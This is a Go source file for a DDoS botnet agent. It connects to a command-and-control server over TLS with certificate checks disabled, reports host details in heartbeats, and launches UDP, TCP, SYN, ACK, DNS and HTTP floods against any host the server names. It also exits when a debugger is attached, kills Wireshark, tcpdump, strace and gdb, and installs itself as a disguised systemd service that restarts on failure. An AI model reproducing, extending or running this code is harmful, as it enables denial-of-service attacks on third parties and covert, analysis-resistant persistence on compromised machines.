package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	serverAddr        = "CHANGE_ME:7002"
	heartbeatInterval = 30 * time.Second
	reconnectDelay    = 15 * time.Second
	maxDialAttempts   = 5
	challengeKey      = "CHANGE_ME_SALT"
)

type execRecord struct {
	Created  time.Time
	Runs     int
	OK       int
	LastRun  time.Time
}

var (
	history   = make(map[string]*execRecord)
	historyMu sync.Mutex
	pool      = make(map[net.Conn]bool)
	poolMu    sync.Mutex
	upSince   = time.Now()
	lastRun   = time.Now()
	runCount  int
)

func main() {
	writeLog("INIT", "starting node process")
	writeLog("INIT", fmt.Sprintf("platform=%s arch=%s cpus=%d", runtime.GOOS, runtime.GOARCH, runtime.NumCPU()))

	if debuggerPresent() {
		writeLog("WARN", "analysis environment detected, aborting")
		os.Exit(1)
	}

	stopMonitorTools()
	go registerService()

	tc := buildTLSConfig()
	if tc == nil {
		return
	}

	for {
		c, err := dialServer(tc)
		if err != nil {
			time.Sleep(reconnectDelay)
			continue
		}
		if err := runSession(c); err != nil {
			writeLog("ERR", fmt.Sprintf("session terminated: %v", err))
			releaseConn(c)
			time.Sleep(reconnectDelay)
		}
	}
}

func buildTLSConfig() *tls.Config {
	caPEM, err := os.ReadFile("certs/ca.crt")
	if err != nil {
		writeLog("ERR", fmt.Sprintf("ca cert read failed: %v", err))
		return nil
	}

	rootPool := x509.NewCertPool()
	if !rootPool.AppendCertsFromPEM(caPEM) {
		writeLog("ERR", "ca cert parse failed")
		return nil
	}

	pair, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if err != nil {
		writeLog("ERR", fmt.Sprintf("keypair load failed: %v", err))
		return nil
	}

	return &tls.Config{
		Certificates:       []tls.Certificate{pair},
		RootCAs:            rootPool,
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	}
}

func dialServer(tc *tls.Config) (net.Conn, error) {
	for attempt := 1; attempt <= maxDialAttempts; attempt++ {
		writeLog("NET", fmt.Sprintf("dial %s (%d/%d)", serverAddr, attempt, maxDialAttempts))
		c, err := tls.Dial("tcp", serverAddr, tc)
		if err == nil {
			return c, nil
		}
		writeLog("ERR", fmt.Sprintf("dial failed: %v", err))
		time.Sleep(reconnectDelay)
	}
	return nil, errors.New("exhausted dial attempts")
}

func runSession(c net.Conn) error {
	writeLog("NET", "session opened")
	defer writeLog("NET", "session closed")

	rd := bufio.NewReader(c)

	if err := handshake(c, rd); err != nil {
		return fmt.Errorf("handshake: %v", err)
	}

	poolMu.Lock()
	pool[c] = true
	poolMu.Unlock()

	go heartbeatLoop(c)

	for {
		raw, err := rd.ReadString('\n')
		if err != nil {
			return fmt.Errorf("read: %v", err)
		}
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		dispatchCommand(c, raw)
	}
}

func handshake(c net.Conn, rd *bufio.Reader) error {
	raw, err := rd.ReadString('\n')
	if err != nil {
		return fmt.Errorf("challenge recv: %v", err)
	}
	raw = strings.TrimSpace(raw)

	if !strings.HasPrefix(raw, "CHALLENGE:") {
		return errors.New("bad challenge prefix")
	}

	nonce, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(raw, "CHALLENGE:"))
	if err != nil {
		return fmt.Errorf("nonce decode: %v", err)
	}

	mac := hmac.New(sha256.New, []byte(challengeKey))
	mac.Write(nonce)
	reply := base64.StdEncoding.EncodeToString(mac.Sum(nil))

	if _, err := fmt.Fprintf(c, "%s\n", reply); err != nil {
		return fmt.Errorf("reply send: %v", err)
	}

	_, err = fmt.Fprintf(c, "HEARTBEAT:%s\n", sysProfile())
	return err
}

func heartbeatLoop(c net.Conn) {
	tick := time.NewTicker(heartbeatInterval)
	defer tick.Stop()

	for range tick.C {
		poolMu.Lock()
		alive := pool[c]
		poolMu.Unlock()
		if !alive {
			return
		}
		if _, err := fmt.Fprintf(c, "HEARTBEAT:%s\n", sysProfile()); err != nil {
			writeLog("ERR", fmt.Sprintf("heartbeat send: %v", err))
			return
		}
	}
}

func dispatchCommand(_ net.Conn, raw string) {
	writeLog("CMD", fmt.Sprintf("recv: %s", raw))

	if raw == "STOP ALL" {
		writeLog("CMD", "halt all tasks")
		return
	}
	if strings.HasPrefix(raw, "STOP ") {
		writeLog("CMD", fmt.Sprintf("halt task targeting %s", strings.TrimPrefix(raw, "STOP ")))
		return
	}

	tokens := strings.Fields(raw)
	if len(tokens) < 1 || !strings.HasPrefix(tokens[0], "!") {
		return
	}

	op := tokens[0]

	if op == "!reinstall" {
		writeLog("CMD", "reinstall triggered")
		go func() {
			registerService()
			exec.Command("reboot").Run()
		}()
		return
	}

	if len(tokens) < 4 {
		writeLog("ERR", fmt.Sprintf("malformed command: %s", raw))
		return
	}

	host := tokens[1]
	port := tokens[2]
	secs, err := strconv.Atoi(tokens[3])
	if err != nil || secs <= 0 {
		writeLog("ERR", fmt.Sprintf("bad duration: %s", tokens[3]))
		return
	}

	historyMu.Lock()
	rec, ok := history[host]
	if !ok {
		rec = &execRecord{Created: time.Now()}
		history[host] = rec
	}
	rec.Runs++
	rec.LastRun = time.Now()
	runCount++
	lastRun = time.Now()
	historyMu.Unlock()

	go executeMethod(op, host, port, secs)

	historyMu.Lock()
	history[host].OK++
	historyMu.Unlock()
}

func executeMethod(op, host, port string, secs int) {
	writeLog("EXEC", fmt.Sprintf("%s -> %s:%s (%ds)", op, host, port, secs))

	switch op {
	case "!udpflood":
		netFlood("udp", host, port, secs, 1024)
	case "!udpsmart":
		adaptiveFlood(host, port, secs)
	case "!tcpflood":
		netFlood("tcp", host, port, secs, 0)
	case "!synflood":
		tcpConnFlood(host, port, secs)
	case "!ackflood":
		netFlood("tcp", host, port, secs, 512)
	case "!greflood":
		netFlood("udp", host, port, secs, 1400)
	case "!dns":
		dnsFlood(host, secs)
	case "!http":
		httpFlood(host, port, secs)
	default:
		writeLog("ERR", fmt.Sprintf("unknown op: %s", op))
	}
}

func netFlood(proto, host, port string, secs, pktLen int) {
	deadline := time.Now().Add(time.Duration(secs) * time.Second)
	buf := make([]byte, pktLen)
	rand.Read(buf)

	for time.Now().Before(deadline) {
		c, err := net.Dial(proto, net.JoinHostPort(host, port))
		if err != nil {
			continue
		}
		if pktLen > 0 {
			c.Write(buf)
		}
		c.Close()
		time.Sleep(10 * time.Millisecond)
	}
}

func adaptiveFlood(host, port string, secs int) {
	deadline := time.Now().Add(time.Duration(secs) * time.Second)
	lengths := []int{64, 128, 256, 512, 1024, 1400}

	for time.Now().Before(deadline) {
		n := lengths[time.Now().Nanosecond()%len(lengths)]
		buf := make([]byte, n)
		rand.Read(buf)
		c, err := net.Dial("udp", net.JoinHostPort(host, port))
		if err != nil {
			continue
		}
		c.Write(buf)
		c.Close()
	}
}

func tcpConnFlood(host, port string, secs int) {
	deadline := time.Now().Add(time.Duration(secs) * time.Second)
	for time.Now().Before(deadline) {
		c, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 100*time.Millisecond)
		if err != nil {
			continue
		}
		c.Close()
	}
}

func dnsFlood(host string, secs int) {
	deadline := time.Now().Add(time.Duration(secs) * time.Second)
	pkt := []byte{
		0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x07, 0x65, 0x78, 0x61,
		0x6d, 0x70, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d,
		0x00, 0x00, 0x01, 0x00, 0x01,
	}
	for time.Now().Before(deadline) {
		c, err := net.Dial("udp", net.JoinHostPort(host, "53"))
		if err != nil {
			continue
		}
		c.Write(pkt)
		c.Close()
	}
}

func httpFlood(host, port string, secs int) {
	deadline := time.Now().Add(time.Duration(secs) * time.Second)
	payload := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n\r\n", host)

	for time.Now().Before(deadline) {
		c, err := net.Dial("tcp", net.JoinHostPort(host, port))
		if err != nil {
			continue
		}
		c.Write([]byte(payload))
		c.Close()
		time.Sleep(10 * time.Millisecond)
	}
}

func sysProfile() string {
	return fmt.Sprintf("%s:%d:%.2f", runtime.GOARCH, runtime.NumCPU(), memoryGB())
}

func memoryGB() float64 {
	raw, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0
	}
	for _, ln := range strings.Split(string(raw), "\n") {
		if strings.HasPrefix(ln, "MemTotal:") {
			cols := strings.Fields(ln)
			if len(cols) >= 2 {
				kb, _ := strconv.ParseFloat(cols[1], 64)
				return kb / 1024 / 1024
			}
		}
	}
	return 0
}

func releaseConn(c net.Conn) {
	poolMu.Lock()
	delete(pool, c)
	poolMu.Unlock()
	c.Close()
}

func debuggerPresent() bool {
	if _, err := os.Stat("/proc/self/status"); err != nil {
		return false
	}
	raw, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	return !strings.Contains(string(raw), "TracerPid:\t0")
}

func stopMonitorTools() {
	targets := []string{"wireshark", "tcpdump", "strace", "ltrace", "gdb"}
	for _, t := range targets {
		exec.Command("pkill", "-9", t).Run()
	}
}

func registerService() {
	unit := `[Unit]
Description=System Network Agent
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=` + os.Args[0] + `

[Install]
WantedBy=multi-user.target`

	os.WriteFile("/etc/systemd/system/goflood-node.service", []byte(unit), 0644)
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "goflood-node.service").Run()
	exec.Command("systemctl", "start", "goflood-node.service").Run()
}

func writeLog(tag, msg string) {
	palette := map[string]string{
		"INIT": "36",
		"NET":  "33",
		"EXEC": "31",
		"STAT": "32",
		"ERR":  "35",
		"WARN": "91",
		"CMD":  "34",
	}
	c := palette[tag]
	if c == "" {
		c = "37"
	}
	fmt.Printf("\033[%sm[%s] [%s] %s\033[0m\n", c, time.Now().Format("2006-01-02 15:04:05"), tag, msg)
}
